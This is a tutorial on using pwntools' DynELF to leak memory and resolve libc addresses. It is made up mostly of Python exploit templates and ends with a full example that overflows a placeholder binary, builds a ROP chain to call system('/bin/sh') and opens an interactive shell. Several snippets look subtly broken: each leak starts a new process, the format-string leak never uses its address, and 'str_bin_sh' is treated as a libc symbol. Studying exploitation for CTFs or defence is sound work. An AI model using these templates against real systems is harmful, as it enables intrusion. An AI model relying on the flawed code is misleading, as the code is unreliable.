# Pwntools DynELF: Libc Symbol Resolution

## Overview

The `DynELF` class resolves libc symbols at runtime by leaking memory and parsing the dynamic linker structures. Useful when libc base address is unknown.

## Basic Usage

### Create DynELF Object

```python
from pwn import *

# Define leak function
def leak(address):
    p = process('./binary')
    p.sendline(f'leak {hex(address)}'.encode())
    return p.recv(8)

# Create DynELF object
d = DynELF(leak, elf=ELF('./binary'))

# Resolve symbol
system_addr = d.lookup('system', 'libc')
print(hex(system_addr))
```

### Leak Function

```python
# Leak function must:
# 1. Take an address as parameter
# 2. Return bytes at that address
# 3. Return None if leak fails

def leak(address):
    try:
        p = process('./binary')
        # Send request to leak address
        p.sendline(f'leak {hex(address)}'.encode())
        # Receive leaked bytes
        data = p.recv(8)
        p.close()
        return data
    except:
        return None
```

## Common Patterns

### Leak via Format String

```python
def leak(address):
    p = process('./binary')

    # Use format string to leak
    payload = b'%' + str(offset).encode() + b'$p'
    p.sendline(payload)

    leaked = p.recvline().strip()
    p.close()

    return unhex(leaked)
```

### Leak via Buffer Overflow

```python
def leak(address):
    p = process('./binary')

    # Send address to leak
    payload = p64(address)
    p.sendline(payload)

    # Receive leaked data
    data = p.recv(8)
    p.close()

    return data
```

### Leak via Information Disclosure

```python
def leak(address):
    p = process('./binary')

    # Binary prints memory at address
    p.sendline(f'print {hex(address)}'.encode())

    # Parse output
    output = p.recvline()
    p.close()

    return unhex(output)
```

## Resolve Symbols

### Single Symbol

```python
d = DynELF(leak, elf=ELF('./binary'))

# Resolve system
system_addr = d.lookup('system', 'libc')
print(f"system: {hex(system_addr)}")

# Resolve execve
execve_addr = d.lookup('execve', 'libc')
print(f"execve: {hex(execve_addr)}")
```

### Multiple Symbols

```python
d = DynELF(leak, elf=ELF('./binary'))

symbols = ['system', 'execve', 'exit', 'write', 'read']
for sym in symbols:
    addr = d.lookup(sym, 'libc')
    print(f"{sym}: {hex(addr)}")
```

## Complete Exploitation Example

```python
from pwn import *

elf = ELF('./binary')

# Define leak function
def leak(address):
    p = process('./binary')
    p.sendline(f'leak {hex(address)}'.encode())
    data = p.recv(8)
    p.close()
    return data

# Create DynELF
d = DynELF(leak, elf=elf)

# Resolve system
system_addr = d.lookup('system', 'libc')
bin_sh = d.lookup('str_bin_sh', 'libc')

# Build ROP chain
rop = ROP(elf)
rop.call('system', [bin_sh])

# Send exploit
p = process('./binary')
payload = b'A' * 100 + rop.chain()
p.sendline(payload)
p.interactive()
```

## Advanced: Cache Results

```python
# DynELF caches lookups automatically
d = DynELF(leak, elf=ELF('./binary'))

# First lookup - performs leak
system_addr = d.lookup('system', 'libc')

# Second lookup - uses cache
system_addr2 = d.lookup('system', 'libc')  # No leak performed

# Access cache
print(d.cache)
```

## Debugging

```python
# Enable verbose output
context.log_level = 'debug'

d = DynELF(leak, elf=ELF('./binary'))
system_addr = d.lookup('system', 'libc')

# Print resolved addresses
print(d.cache)
```

## Common Issues

### Leak Function Fails
- Verify leak function returns correct bytes
- Check address alignment
- Ensure binary has information disclosure vulnerability

### Symbol Not Found
- Verify symbol exists in libc
- Check libc version
- Try alternative symbol names

### Performance Issues
- DynELF performs multiple leaks
- Cache results when possible
- Consider using precomputed libc base if available
